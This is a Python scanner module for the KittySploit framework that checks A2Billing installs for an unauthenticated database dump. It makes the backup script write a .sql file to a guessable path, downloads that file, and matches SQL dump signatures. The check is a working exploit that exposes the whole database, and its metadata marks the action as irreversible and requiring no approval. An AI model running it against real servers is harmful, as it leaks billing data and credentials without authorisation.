#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A2Billing unauthenticated SQL dump via A2B_entity_backup.php."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'A2Billing - Unauth SQL Dump Detection',
        'description': (
            'Detects A2Billing backup abuse by triggering A2B_entity_backup.php dump to a '
            'guessable .sql path and downloading it.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'a2billing', 'exposure', 'sqli', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential_leak', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/41685',
        ],
    }

    def run(self):
        import re
        name = self.random_text(12)
        for base in ('', '/a2billing', '/A2Billing'):
            trigger = f'{base}/A2B_entity_backup.php?form_action=add&path={name}.sql'
            self.http_request(method='GET', path=trigger, allow_redirects=False)
            time.sleep(2)
            dump = f'{base}/{name}.sql'
            r = self.http_request(method='GET', path=dump, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if re.search(r'^(-- (MySQL|MariaDB) dump |INSERT INTO |DROP TABLE |CREATE TABLE )', body, re.M):
                self.set_info(
                    severity='critical',
                    reason='A2Billing unauthenticated SQL dump',
                    path=dump,
                )
                return True
        return False
